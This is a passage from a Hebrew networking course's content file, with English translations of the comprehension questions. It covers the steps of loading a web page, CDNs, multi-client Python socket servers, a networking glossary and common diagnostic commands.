            <li><strong><code>HTTP GET</code></strong> — ה-<code>Edge</code> בודק <code>cache</code>:
              <ul>
                <li><strong><code>Cache HIT</code></strong> — מגיש מיידית</li>
                <li><strong><code>Cache MISS</code></strong> — מביא מ-<code>Origin</code>, שומר, ואז מגיש</li>
              </ul>
            </li>
            <li><strong>תמונות, <code>JS</code>, <code>CSS</code></strong> — מגיעים מה-<code>Edge</code></li>
            <li><strong><code>HTML</code> דינמי</strong> — עשוי לעבור ל-<code>Origin</code></li>
          </ol>
          <p>זו הסיבה ש-<code>Facebook</code> נטען תוך 200ms מישראל, למרות שהשרתים הראשיים באמריקה.</p>
          <p>שרת <code>CDN Edge</code> בתל אביב או קפריסין מגיש את רוב התוכן.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – הכל מתחבר",
        intro: "<p>נקודות מבט על הארכיטקטורה השלמה:</p>",
        blocks: [
          {
            title: "כמה פקטות בגלישה אחת?",
            icon: "📊",
            content: `<p>גלישה פשוטה לעמוד <code>GitHub</code> שולחת כ-200 פקטות.</p>
              <ul>
                <li><code>DHCP</code>: 4 פקטות</li>
                <li><code>DNS</code>: 2 פקטות</li>
                <li><code>ARP</code>: 2 פקטות</li>
                <li><code>TCP Handshake</code>: 3 פקטות</li>
                <li><code>TLS Handshake</code>: כ-8 פקטות</li>
                <li>בקשות <code>HTTP/2</code>: עשרות פקטות</li>
              </ul>
              <p>כל משאב חיצוני דורש בקשת <code>DNS</code> + <code>TCP</code> + <code>TLS</code> + <code>HTTP</code> בנפרד.</p>
              <p>בדף מסחרי טיפוסי עם סקריפטים של צד שלישי: 500 עד 2000 פקטות.</p>
              <p>הפעלת <code>Wireshark</code> על גלישה פשוטה מגלה עולם שלם.</p>`
          },
          {
            title: "מה אם ה-DNS שלך לא עובד?",
            icon: "🔍",
            content: `<p>כדי לאבחן בעיית <code>DNS</code>, מריצים את הניסוי הבא:</p>
              <ul>
                <li>אם <code>ping 8.8.8.8</code> עובד אבל <code>ping google.com</code> נכשל — יש בעיית <code>DNS</code>.</li>
                <li>אם <code>nslookup google.com 8.8.8.8</code> עובד — ה-<code>DNS</code> של ספק האינטרנט מושבת, אבל <code>DNS</code> ציבורי תקין.</li>
                <li>פתרון: שנה את שרת ה-<code>DNS</code> בהגדרות הרשת.</li>
              </ul>
              <p><strong><code>DNS</code> הוא נקודת חנק.</strong></p>
              <p>ספק האינטרנט שולט ב-<code>DNS</code> ויכול לחסום אתרים.</p>
              <p>פרוטוקולים כמו <code>DoH</code> ו-<code>VPN</code> עוקפים מגבלה זו.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 11",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>DHCP</code> → <code>IP</code>. <code>DNS</code> → <code>IP</code> של יעד. בדיקת <code>Subnet</code> → מקומי? לא → <code>ARP</code> ל-<code>Gateway</code></li>
              <li><code>ARP</code> → <code>MAC</code> של נתב. <code>Switch</code> מעביר <code>Frame</code>. נתבים מנתבים עד היעד</li>
              <li><code>TCP Handshake</code> — <code>SYN</code>/<code>SYN-ACK</code>/<code>ACK</code>. <code>TLS Handshake</code> — <code>HTTPS</code>. <code>HTTP/2 GET</code></li>
              <li><code>Wireshark</code> מראה הכל: <code>DHCP</code>→<code>DNS</code>→<code>ARP</code>→<code>TCP</code>→<code>TLS</code>→<code>HTTP/2</code> בסדר</li>
              <li><code>CDN</code> — <code>TLS</code> ו-<code>cache</code> ב-<code>Edge</code> קרוב. <code>Origin</code> רק ל-<code>dynamic</code> / <code>cache miss</code></li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 11",
        titleEn: "Chapter 11 — Comprehension Questions",
        questions: [
          {
            q: "מה הסדר הנכון של הפעולות בגלישה לאתר?",
            a: "DHCP — אם צריך IP — → DNS — תרגום שם ל-IP — → בדיקת Subnet — האם היעד ברשת מקומית? → אם לא – ARP למען MAC של Gateway → שליחת Frame ל-Switch → נתבים מנתבים → TCP Handshake → TLS Handshake — HTTPS — → HTTP GET.",
            qEn: "What is the correct order of actions when browsing to a website?",
            aEn: "DHCP (if IP is needed) -> DNS (translate name to IP) -> Subnet check (is the destination on the local network?) -> if not, ARP to get the Gateway MAC -> send Frame to Switch -> routers forward the packet -> TCP Handshake -> TLS Handshake (HTTPS) -> HTTP GET."
          },
          {
            q: "למה ping 8.8.8.8 עובד אבל ping google.com לא?",
            a: "ping 8.8.8.8 = שולח ICMP לIP ישיר – לא צריך DNS. ping google.com = צריך תרגום שם לIP תחילה. אם DNS לא עובד – תרגום נכשל ולכן ה-ping נכשל. האינטרנט עצמו עובד, DNS לא.",
            qEn: "Why does ping 8.8.8.8 work but ping google.com does not?",
            aEn: "ping 8.8.8.8 sends ICMP directly to an IP — no DNS needed. ping google.com needs to translate the name to an IP first. If DNS is not working, the translation fails and the ping fails. The Internet itself works, but DNS does not."
          },
          {
            q: "מה ה-TLS Handshake מוסיף לתהליך ולמה הוא שווה את זה?",
            a: "TLS Handshake מוסיף RTT אחד — 1.3 — לפני שאפשר לשלוח HTTP. עלות: 20–100ms. תמורה: כל התקשורת מוצפנת. גם אם מישהו מסנן את הרשת — WiFi ציבורי, ISP – רואה רק 'שטות' מוצפנת. סיסמה, cookies, תוכן – הכל מוגן.",
            qEn: "What does the TLS Handshake add to the process and why is it worth it?",
            aEn: "The TLS Handshake adds one RTT (in TLS 1.3) before HTTP data can be sent. Cost: 20-100ms. Benefit: all communication is encrypted. Even if someone sniffs the network — public WiFi, ISP — they see only encrypted nonsense. Passwords, cookies, content — all protected."
          }
        ]
      }
    ]
  },
  {
    id: 12,
    title: "Sockets מתקדם",
    pages: [
      {
        type: "explanation",
        title: "ריבוי לקוחות",
        content: `
          <p><strong>ריבוי לקוחות</strong></p>
          <p>שרת בסיסי מטפל בלקוח אחד בלבד.</p>
          <p>הסיבה — הפונקציות <code>accept()</code> ו-<code>recv()</code> הן <strong><code>blocking</code></strong>.</p>
          <p>הן עוצרות את התוכנית עד שמגיע מידע.</p>
          <p><strong>פתרונות לטיפול בכמה לקוחות בו-זמנית</strong></p>
          <ul>
            <li><strong><code>select</code></strong> — בודק כמה <code>Sockets</code> ומחזיר את אלה שמוכנים לפעולה</li>
            <li><strong><code>threading</code></strong> — יוצר תהליך נפרד לכל לקוח</li>
            <li><strong><code>asyncio</code></strong> — תכנות אסינכרוני עם <code>event loop</code> אחד</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "select – המתנה ליותר מ־Socket אחד",
        content: `
          <p><strong><code>select</code></strong></p>
          <p>הפונקציה <code>select.select(read_list, write_list, error_list, timeout)</code> מחזירה את ה-<code>Sockets</code> שמוכנים לפעולה.</p>
          <p>כך שרת אחד יכול להאזין ל-<code>accept</code> על <code>Socket</code> אחד ובמקביל לקבל מידע מלקוחות קיימים — בלי לחסום.</p>
          <p><strong>אלטרנטיבות</strong></p>
          <ul>
            <li><strong><code>threading</code></strong> — <code>Thread</code> נפרד לכל לקוח</li>
            <li><strong><code>asyncio</code></strong> — תכנות אסינכרוני עם <code>event loop</code> אחד</li>
          </ul>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: דוגמת select",
        content: `
          <p>קוד סכמטי ל-<code>select</code>:</p>
          <div class="code-preview">
            <pre><code>readable, _, _ = select.select([server_socket] + client_sockets, [], [], 0.1)
for s in readable:
    if s == server_socket:
        client, addr = server_socket.accept()
        client_sockets.append(client)
    else:
        data = s.recv(1024)
        if data: process(s, data)
        else: client_sockets.remove(s)</code></pre>
          </div>
          <ul>
            <li><code>select</code> מחזיר את ה-<code>Sockets</code> שמוכנים לפעולה</li>
            <li>אם <code>server_socket</code> מוכן — מבצעים <code>accept</code></li>
            <li>אם <code>Socket</code> של לקוח מוכן — מבצעים <code>recv</code></li>
            <li>כך שרת אחד מטפל בהרבה לקוחות ללא <code>blocking</code></li>
          </ul>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שרת עם Threading",
        content: `
          <p>כל לקוח מקבל <code>Thread</code> נפרד — עיבוד מקבילי:</p>
          <div class="code-preview">
            <pre><code>import socket
import threading

def handle_client(client_socket, addr):
    print(f"חיבור חדש מ: {addr}")
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        client_socket.send(b"קיבלתי: " + data)
    client_socket.close()

server = socket.socket()
server.bind(('0.0.0.0', 9000))
server.listen(5)
print("מאזין...")

while True:
    client, addr = server.accept()
    t = threading.Thread(target=handle_client, args=(client, addr))
    t.daemon = True
    t.start()</code></pre>
          </div>
          <ul>
            <li>כל <code>accept()</code> יוצר <code>Thread</code> חדש שמריץ את <code>handle_client</code></li>
            <li><code>daemon=True</code> — ה-<code>Thread</code> יסתיים אוטומטית כשהתוכנה הראשית תסתיים</li>
            <li>חיסרון — הרבה לקוחות = הרבה <code>Threads</code> = צריכת זיכרון גבוהה</li>
            <li>פתרון — <code>Thread Pool</code> להגבלת מספר ה-<code>Threads</code></li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "Python 3 – Encoding וBytes",
        content: `
          <p>ב-<code>Python 3</code>, הפונקציות <code>send()</code> ו-<code>recv()</code> עובדות עם <strong><code>bytes</code></strong> — לא מחרוזות.</p>
          <p>כל טקסט חייב להיות מקודד לפני שליחה ומפוענח אחרי קבלה.</p>
          <div class="code-preview">
            <pre><code># שליחה – המרת string ל-bytes
message = "שלום"
client_socket.send(message.encode('utf-8'))

# קבלה – המרת bytes ל-string
data = client_socket.recv(1024)
text = data.decode('utf-8')
print(text)</code></pre>
          </div>
          <p><code>encode('utf-8')</code> — ממיר <code>string</code> ל-<code>bytes</code>.</p>
          <p><code>decode('utf-8')</code> — ממיר <code>bytes</code> ל-<code>string</code>.</p>
          <p><code>UTF-8</code> תומך בעברית ובכל תווי יוניקוד.</p>
          <p><strong>בעיית <code>recv</code></strong></p>
          <p>הפונקציה <code>recv(1024)</code> לא מבטיחה קבלת בדיוק 1024 בתים.</p>
          <p>המסר עשוי להגיע בחלקים נפרדים — <code>chunks</code>.</p>
          <p><strong>פתרון</strong></p>
          <p>קרא בלולאה עד שמקבלים מסר שלם.</p>
          <ul>
            <li>שורה שמסתיימת ב-<code>\\n</code></li>
            <li>קידומת שמציינת את גודל המסר — <code>Length Prefix</code></li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול תקשורת – Length Prefix",
        content: `
          <p>אחת הבעיות ב-<code>Sockets</code> — איך יודע המקבל שהמסר הסתיים?</p>
          <p><code>recv()</code> יכול להחזיר חלק מהמסר בלבד.</p>
          <p><strong>פתרון 1 — <code>Delimiter</code></strong></p>
          <p>שולחים <code>\\n</code> בסוף כל מסר. מקבלים עד ה-<code>\\n</code>.</p>
          <p><strong>פתרון 2 — <code>Length Prefix</code></strong></p>
          <p>שולחים קודם את גודל המסר — 4 בתים — ואחר כך את המסר עצמו.</p>
          <div class="code-preview">
            <pre><code>import struct

# שליחה
def send_msg(sock, msg):
    msg = msg.encode('utf-8')
    length = struct.pack('!I', len(msg))  # 4 bytes Big-Endian
    sock.sendall(length + msg)

# קבלה
def recv_msg(sock):
    raw_len = recv_exact(sock, 4)
    length = struct.unpack('!I', raw_len)[0]
    return recv_exact(sock, length).decode('utf-8')

def recv_exact(sock, n):
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError
        buf += chunk
    return buf</code></pre>
          </div>
          <ul>
            <li><code>struct.pack</code> — מקודד מספר שלם לבתים</li>
            <li><code>recv_exact</code> — מבטיח קבלת בדיוק <code>n</code> בתים לפני שממשיכים</li>
            <li>שיטה עמידה לבניית פרוטוקול תקשורת אמין</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "asyncio – תכנות אסינכרוני",
        content: `
          <p><strong><code>asyncio</code></strong> — תכנות אסינכרוני ב-<code>Python 3</code></p>
          <p>בניגוד ל-<code>threading</code> שמריץ כמה <code>Threads</code> במקביל, <code>asyncio</code> משתמש ב-<code>event loop</code> אחד.</p>
          <p>מחליף הקשר ביעילות — ללא תקורה של מערכת ההפעלה.</p>
          <div class="code-preview">
            <pre><code>import asyncio

async def handle_client(reader, writer):
    addr = writer.get_extra_info('peername')
    print(f"חיבור מ: {addr}")
    while True:
        data = await reader.read(1024)
        if not data:
            break
        writer.write(b"קיבלתי: " + data)
        await writer.drain()
    writer.close()

async def main():
    server = await asyncio.start_server(
        handle_client, '0.0.0.0', 9000)
    print("מאזין...")
    async with server:
        await server.serve_forever()

asyncio.run(main())</code></pre>
          </div>
          <p><strong><code>async/await</code></strong></p>
          <p>מסמן שפונקציה היא אסינכרונית.</p>
          <p><code>await</code> מחזיר שליטה ל-<code>event loop</code> — מאפשר לטפל בלקוחות אחרים בזמן ההמתנה.</p>
          <p><strong>יתרון</strong></p>
          <ul>
            <li><code>Thread</code> אחד בלבד — ללא תקורה של <code>Context Switch</code></li>
            <li>מתאים לאלפי חיבורים בו-זמנית</li>
          </ul>
          <p><strong>חיסרון</strong></p>
          <p>קוד <code>blocking</code> אחד — כמו <code>sleep</code> רגיל — חוסם את כל ה-<code>event loop</code>.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 12",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>accept</code>/<code>recv</code> חסומים — שרת בסיסי מטפל בלקוח אחד</li>
              <li><code>select</code> — בדיקת כמה <code>Sockets</code> בו-זמנית, ללא <code>blocking</code></li>
              <li><code>threading</code> — <code>Thread</code> נפרד לכל לקוח. <code>daemon=True</code> לניקוי אוטומטי</li>
              <li>Python 3: <code>send</code>/<code>recv</code> עם <code>bytes</code>. <code>encode('utf-8')</code> / <code>decode('utf-8')</code></li>
              <li><code>Length Prefix</code> — שיטה לקריאת מסרים שלמים בוודאות</li>
              <li><code>asyncio</code> — <code>event loop</code> אחד, <code>async/await</code>, מתאים לאלפי חיבורים</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 12",
        titleEn: "Chapter 12 — Comprehension Questions",
        questions: [
          {
            q: "מתי משתמשים ב-select במקום threading?",
            a: "select מתאים כשיש הרבה חיבורים שקטים — מחכים — מעט פעילות. threading מתאים כשיש עיבוד כבד לכל לקוח. select חסכוני במשאבים, threading פשוט לכתיבה.",
            qEn: "When do we use select instead of threading?",
            aEn: "select is good when there are many quiet connections — waiting — with little activity. threading is good when there is heavy processing per client. select saves resources, threading is simpler to write."
          },
          {
            q: "למה recv(1024) לא מספיק לקריאת מסר שלם?",
            a: "TCP הוא stream – המסר יכול להגיע ב-chunks. recv(1024) מחזיר כמה שיש בbuffer – יכול להיות פחות. צריך לקרוא בלולאה עד שמקבלים את כל הנתונים. Length Prefix פותר זאת: קוראים 4 בתים עם הגודל, ואז קוראים בדיוק אותו מספר בתים.",
            qEn: "Why is recv(1024) not enough to read a complete message?",
            aEn: "TCP is a stream — the message can arrive in chunks. recv(1024) returns whatever is in the buffer — it can be less. You need to read in a loop until you get all the data. Length Prefix solves this: read 4 bytes with the size, then read exactly that many bytes."
          },
          {
            q: "מה ההבדל בין threading לasyncio?",
            a: "threading – מספר Threads מקבילים, OS מחליף ביניהם. asyncio – Thread אחד עם event loop, Python מחליף הקשר ב-await. threading מתאים לעיבוד CPU-bound, asyncio מתאים ל-I/O-bound — רשת, קבצים. asyncio עם אלפי חיבורים יותר יעיל.",
            qEn: "What is the difference between threading and asyncio?",
            aEn: "threading — multiple parallel Threads, the OS switches between them. asyncio — one Thread with an event loop, Python switches context at await. threading fits CPU-bound work, asyncio fits I/O-bound work — network, files. asyncio is more efficient with thousands of connections."
          }
        ]
      }
    ]
  },
  {
    id: 13,
    title: "מילון מושגים",
    pages: [
      {
        type: "explanation",
        title: "מושגי רשת – א-ו",
        content: `
          <table class="content-table">
            <tr><th>מונח</th><th>הסבר</th></tr>
            <tr><td><code>ACK</code></td><td>Acknowledgment — אישור קבלת נתונים ב-TCP</td></tr>
            <tr><td><code>Anycast</code></td><td>אותה IP ב-BGP ממקומות רבים — נתב ל-PoP הקרוב. CDN, DNS</td></tr>
            <tr><td><code>API Gateway</code></td><td>נקודת כניסה אחת לכל ה-microservices — Auth, routing, rate limiting</td></tr>
            <tr><td><code>ARP</code></td><td>Address Resolution Protocol — המרת IP ל-MAC ברשת מקומית</td></tr>
            <tr><td><code>Bandwidth</code></td><td>קצב העברה מקסימלי תיאורטי — Mbps, Gbps</td></tr>
            <tr><td><code>BBR</code></td><td>TCP Congestion algorithm של Google — מדד bandwidth ולא אובדן</td></tr>
            <tr><td><code>BGP</code></td><td>Border Gateway Protocol — פרוטוקול ניתוב בין AS-ים באינטרנט</td></tr>
            <tr><td><code>Broadcast</code></td><td>שליחה לכולם ברשת. MAC: FF:FF:FF:FF:FF:FF. IPv6: אין — יש Multicast</td></tr>
            <tr><td><code>CA</code></td><td>Certificate Authority — גוף שחותם על אישורי TLS — DigiCert, Let's Encrypt</td></tr>
            <tr><td><code>CDN</code></td><td>Content Delivery Network — רשת Edge Nodes גלובלית לתוכן קרוב למשתמש</td></tr>
            <tr><td><code>CIDR</code></td><td>Classless Inter-Domain Routing — סימון /prefix לרשתות — 192.168.1.0/24</td></tr>
            <tr><td><code>CNAME</code></td><td>DNS Record — alias — שם → שם. www.x.com → x.com</td></tr>
            <tr><td><code>Congestion Window — cwnd</code></td><td>ב-TCP — כמה בתים השולח שולח ללא ACK בהתאם לעומס רשת</td></tr>
            <tr><td><code>Default Gateway</code></td><td>IP של הנתב המקומי – היעד לכל תעבורה מחוץ לרשת</td></tr>
            <tr><td><code>DHCP</code></td><td>Dynamic Host Configuration Protocol — הקצאת IP, Subnet, Gateway, DNS אוטומטית</td></tr>
            <tr><td><code>DMZ</code></td><td>Demilitarized Zone — אזור רשת מוגן לשרתים ציבוריים — Web, Email</td></tr>
            <tr><td><code>DNS</code></td><td>Domain Name System — מיפוי שם דומיין ל-IP. היררכי: Root → TLD → Authoritative</td></tr>
            <tr><td><code>DoH</code></td><td>DNS over HTTPS — DNS מוצפן על פורט 443</td></tr>
            <tr><td><code>DoT</code></td><td>DNS over TLS — DNS מוצפן על פורט 853</td></tr>
            <tr><td><code>Dual-Stack</code></td><td>הפעלת IPv4 ו-IPv6 בו-זמנית על אותו ממשק</td></tr>
            <tr><td><code>Encapsulation</code></td><td>הוספת Header של שכבה — כל שכבה עוטפת את מעלה</td></tr>
            <tr><td><code>ESP</code></td><td>Encapsulating Security Payload — הצפנה + אימות ב-IPsec</td></tr>
          </table>
        `
      },
      {
        type: "explanation",
        title: "מושגי רשת – ז-מ",
        content: `
          <table class="content-table">
            <tr><th>מונח</th><th>הסבר</th></tr>
            <tr><td><code>FTP</code></td><td>File Transfer Protocol — העברת קבצים. פורט 21. SFTP = SSH File Transfer Protocol — פרוטוקול נפרד מ-FTP שרץ מעל SSH, פורט 22</td></tr>
            <tr><td><code>Full Duplex</code></td><td>שליחה וקבלה בו-זמנית. Switch מודרני. ללא התנגשויות</td></tr>
            <tr><td><code>Half Duplex</code></td><td>כיוון אחד בכל פעם. Hub. גורם להתנגשויות — CSMA/CD</td></tr>
            <tr><td><code>Handshake</code></td><td>TCP: SYN→SYN-ACK→ACK. TLS: Client Hello → Certificate → Key Exchange → Finished</td></tr>
            <tr><td><code>HTTP/2</code></td><td>Multiplexing, Binary, HPACK compression — עדיין על TCP</td></tr>
            <tr><td><code>HTTP/3</code></td><td>HTTP מעל QUIC — UDP. 0-RTT, Connection Migration, ללא HOL Blocking</td></tr>
            <tr><td><code>HTTPS</code></td><td>HTTP over TLS. פורט 443. כל התוכן מוצפן</td></tr>
            <tr><td><code>IKE</code></td><td>Internet Key Exchange — חילופי מפתחות ב-IPsec. UDP פורט 500</td></tr>
            <tr><td><code>IMAP</code></td><td>Internet Message Access Protocol — קריאת מייל מסונכרנת. פורט 143/993</td></tr>
            <tr><td><code>IP Fragmentation</code></td><td>פיצול פקטה גדולה לקטעים לפי MTU. IPv4 בנתבים. IPv6 רק במקור</td></tr>
            <tr><td><code>IPsec</code></td><td>Internet Protocol Security — הצפנה ברמת Layer 3. Tunnel/Transport mode</td></tr>
            <tr><td><code>Jitter</code></td><td>שינוי ב-Latency — חבילות מגיעות בזמנים לא אחידים. בעיה ל-VoIP/Video</td></tr>
            <tr><td><code>Latency</code></td><td>זמן תגובה — כמה זמן לחבילה להגיע. נמדד ב-ms</td></tr>
            <tr><td><code>Link-Local</code></td><td>IPv6 — fe80::/10. אוטומטי על כל ממשק. לא ניתב</td></tr>
            <tr><td><code>Load Balancer</code></td><td>מפנה בקשות לכמה שרתים. L4 — TCP, L7 — HTTP. Round Robin, Least Connections</td></tr>
            <tr><td><code>MAC</code></td><td>Media Access Control — כתובת פיזית 48-bit על כרטיס רשת. d4:be:d9:d6:0c:2a</td></tr>
            <tr><td><code>Multicast</code></td><td>שליחה לקבוצה. IPv6 ff02::1 = כולם. ff02::2 = נתבים. מחליף Broadcast</td></tr>
            <tr><td><code>MTU</code></td><td>Maximum Transmission Unit — גודל מקסימלי של Frame. Ethernet = 1500 בתים</td></tr>
            <tr><td><code>MX Record</code></td><td>DNS Mail Exchange — מפנה מייל לשרת עם עדיפות</td></tr>
          </table>
        `
      },
      {
        type: "explanation",
        title: "מושגי רשת – נ-ת",
        content: `
          <table class="content-table">
            <tr><th>מונח</th><th>הסבר</th></tr>
            <tr><td><code>NAT</code></td><td>Network Address Translation — IP פרטי → ציבורי. PAT = עם פורטים</td></tr>
            <tr><td><code>NAT64</code></td><td>תרגום IPv6 → IPv4. עם DNS64 לגישה לשרתים IPv4-only מ-IPv6-only clients</td></tr>
            <tr><td><code>NDP</code></td><td>Neighbor Discovery Protocol — מחליף ARP ב-IPv6. NS/NA/RS/RA</td></tr>
            <tr><td><code>Packet</code></td><td>יחידת מידע בשכבת הרשת — Layer 3. IP Packet</td></tr>
            <tr><td><code>Port</code></td><td>0–65535. מזהה תוכנה. ידועים: 80=HTTP, 443=HTTPS, 22=SSH, 53=DNS</td></tr>
            <tr><td><code>PoP</code></td><td>Point of Presence — מיקום פיזי של CDN. מאות בעולם</td></tr>
            <tr><td><code>PTR Record</code></td><td>Reverse DNS — IP → שם. 8.8.8.8 → dns.google</td></tr>
            <tr><td><code>QUIC</code></td><td>UDP-based transport. TLS 1.3 מובנה. Connection Migration. בסיס HTTP/3</td></tr>
            <tr><td><code>Receive Window — rwnd</code></td><td>TCP Flow Control – כמה בתים המקבל יכול לקבל. מודיע בכל ACK</td></tr>
            <tr><td><code>REST</code></td><td>API ארכיטקטורה מעל HTTP. GET/POST/PUT/PATCH/DELETE על URLs</td></tr>
            <tr><td><code>RTO</code></td><td>Retransmission Timeout. RTO = SRTT + 4×RTTVAR. מוכפל עם כל timeout</td></tr>
            <tr><td><code>SLAAC</code></td><td>Stateless Address Autoconfiguration – IPv6 IP מ-prefix+MAC. ללא DHCP</td></tr>
            <tr><td><code>SMTP</code></td><td>Simple Mail Transfer Protocol — שליחת מייל. פורט 25/587</td></tr>
            <tr><td><code>SOA Record</code></td><td>Start of Authority — מטא-נתוני זון DNS — Serial, Refresh, Retry, Expire</td></tr>
            <tr><td><code>SSH</code></td><td>Secure Shell — גישה מרוחקת מוצפנת. פורט 22. מחליף Telnet</td></tr>
            <tr><td><code>SSL/TLS</code></td><td>Secure Sockets Layer / Transport Layer Security — הצפנת תקשורת. HTTPS</td></tr>
            <tr><td><code>Subnet Mask</code></td><td>מגדיר גבול רשת. /24 = 255.255.255.0 — /prefix = CIDR</td></tr>
            <tr><td><code>TCP</code></td><td>Transmission Control Protocol — אמין, Handshake, ACK, Congestion Control</td></tr>
            <tr><td><code>Throughput</code></td><td>קצב העברה בפועל — נמוך מ-Bandwidth בגלל overhead ואובדן</td></tr>
            <tr><td><code>TLS</code></td><td>Transport Layer Security — הצפנה. Handshake, Certificate, AES Session Key</td></tr>
            <tr><td><code>TTL</code></td><td>Time To Live — ב-IP: מונע לולאות — traceroute. ב-DNS: כמה זמן לcache</td></tr>
            <tr><td><code>TXT Record</code></td><td>DNS Text Record — SPF, DKIM, אימות דומיין</td></tr>
            <tr><td><code>UDP</code></td><td>User Datagram Protocol — מהיר, ללא ערבויות. DNS, VoIP, Games, QUIC</td></tr>
            <tr><td><code>Unicast</code></td><td>שליחה ליעד אחד ספציפי</td></tr>
            <tr><td><code>VLAN</code></td><td>Virtual LAN — חלוקה לוגית של Switch. Broadcast Domain נפרד</td></tr>
            <tr><td><code>VPN</code></td><td>Virtual Private Network — מנהרה מוצפנת. IPsec, WireGuard, OpenVPN</td></tr>
            <tr><td><code>WebSocket</code></td><td>חיבור HTTP שמתשדרג לדו-כיווני מתמשך. Chat, Real-time</td></tr>
            <tr><td><code>WireGuard</code></td><td>VPN מינימליסטי. UDP. ChaCha20+Curve25519. Linux kernel 5.6+</td></tr>
            <tr><td><code>Zero Trust</code></td><td>אל תאמין, תמיד אמת. כל בקשה מאומתת – גם מרשת פנימית</td></tr>
          </table>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 13",
        titleEn: "Chapter 13 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין Broadcast ל-Unicast ל-Multicast?",
            a: "Unicast – שליחה ליעד אחד — כתובת ספציפית. Broadcast — שליחה לכל המכשירים ברשת המקומית — MAC: FF:FF:FF:FF:FF:FF. Multicast — שליחה לקבוצה מוגדרת — ff02::1 = כל IPv6, קבוצות IGMP ב-IPv4. IPv6 ביטל Broadcast לטובת Multicast.",
            qEn: "What is the difference between Broadcast, Unicast, and Multicast?",
            aEn: "Unicast — sending to one destination with a specific address. Broadcast — sending to all devices on the local network (MAC: FF:FF:FF:FF:FF:FF). Multicast — sending to a defined group. IPv6 removed Broadcast and uses Multicast instead."
          },
          {
            q: "מה ההבדל בין TTL ב-IP ל-TTL ב-DNS?",
            a: "TTL ב-IP — Time To Live – מספר hop-ים שנותרו. כל נתב מפחית ב-1. מגיע ל-0 → נזרק + ICMP Time Exceeded. traceroute משתמש בזה. TTL ב-DNS – כמה שניות ה-Resolver ישמור record ב-cache. לא קשור לנתבים.",
            qEn: "What is the difference between TTL in IP and TTL in DNS?",
            aEn: "TTL in IP — Time To Live — the number of hops remaining. Each router decreases it by 1. When it reaches 0, the packet is dropped and ICMP Time Exceeded is sent. traceroute uses this. TTL in DNS — how many seconds the Resolver will keep a record in cache. Not related to routers."
          },
          {
            q: "מה ההבדל בין Bandwidth ל-Throughput ל-Latency?",
            a: "Bandwidth = קצב מקסימלי תיאורטי של הקישור — 1Gbps. Throughput = מה עובר בפועל — תמיד נמוך — overhead, אובדן. Latency = זמן מקור לייעד — ms. אפשר bandwidth גבוה + latency גבוה — לווין. קו 100Mbps עם 500ms latency = גרוע לgames, טוב ל-backup.",
            qEn: "What is the difference between Bandwidth, Throughput, and Latency?",
            aEn: "Bandwidth is the maximum theoretical speed of the link — 1Gbps. Throughput is what actually passes — always lower due to overhead and loss. Latency is the time from source to destination in ms. You can have high bandwidth with high latency — like satellite. A 100Mbps line with 500ms latency is bad for games but fine for backup."
          }
        ]
      }
    ]
  },
  {
    id: 14,
    title: "פקודות וכלים",
    pages: [
      {
        type: "explanation",
        title: "פקודות נפוצות",
        content: `
          <p><strong>פקודות אבחון רשת</strong></p>
          <ul>
            <li><code>ping &lt;יעד&gt;</code> — בדיקת חיבור באמצעות <code>ICMP Echo</code></li>
            <li><code>tracert</code> — Windows / <code>traceroute</code> — Linux — הצגת מסלול החבילות ברשת</li>
            <li><code>netstat</code> — הצגת פורטים פתוחים וחיבורים פעילים</li>
            <li><code>ipconfig</code> — Windows / <code>ifconfig</code> — Linux — הצגת הגדרות רשת: <code>IP</code>, <code>MAC</code>, <code>Subnet</code>, <code>Gateway</code></li>
            <li><code>nslookup &lt;דומיין&gt;</code> — שאילתת <code>DNS</code> לתרגום שם לכתובת <code>IP</code></li>
            <li><code>arp -a</code> — הצגת טבלת <code>ARP Cache</code></li>
          </ul>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: דוגמאות פלט",
        content: `
          <p>פלט <code>ipconfig /all</code>:</p>
          <div class="code-preview">
            <pre><code>IPv4 Address: 192.168.1.105
Subnet Mask: 255.255.255.0
Default Gateway: 192.168.1.1
Physical Address: D4-BE-D9-D6-0C-2A</code></pre>
          </div>
          <p>פלט <code>nslookup google.com</code>:</p>
          <div class="code-preview">
            <pre><code>Name: google.com
Addresses: 142.250.185.46</code></pre>
          </div>
        `
      },
      {
        type: "explanation",
        title: "כלים",
        content: `
          <p><strong><code>Wireshark</code></strong></p>
          <p>כלי להסנפה וניתוח תעבורת רשת.</p>
          <p>מאפשר לראות כל חבילה שעוברת.</p>
          <p>שימושי לאבחון ולמידה.</p>
          <p><strong><code>Scapy</code></strong></p>
          <p>ספריית <code>Python</code> להסנפה, לבנייה ולשליחה של חבילות רשת.</p>
          <p><strong><code>telnet</code></strong></p>
          <p>התחברות ידנית לפורט ספציפי.</p>
          <p>שימושי לבדיקת שירותים כמו <code>HTTP</code>.</p>
        `
      },
      {
        type: "explanation",
        title: "פקודות נוספות",
        content: `
          <p><strong>פקודות נוספות</strong></p>
          <ul>
            <li><code>route print</code> — Windows / <code>ip route</code> — Linux — הצגת טבלת הניתוב</li>
            <li><code>hostname</code> — הצגת שם המחשב</li>
            <li><code>telnet &lt;host&gt; &lt;port&gt;</code> — התחברות ידנית לפורט ספציפי</li>
            <li><code>curl</code> — שליחת בקשת <code>HTTP</code> משורת הפקודה</li>
          </ul>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 14",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
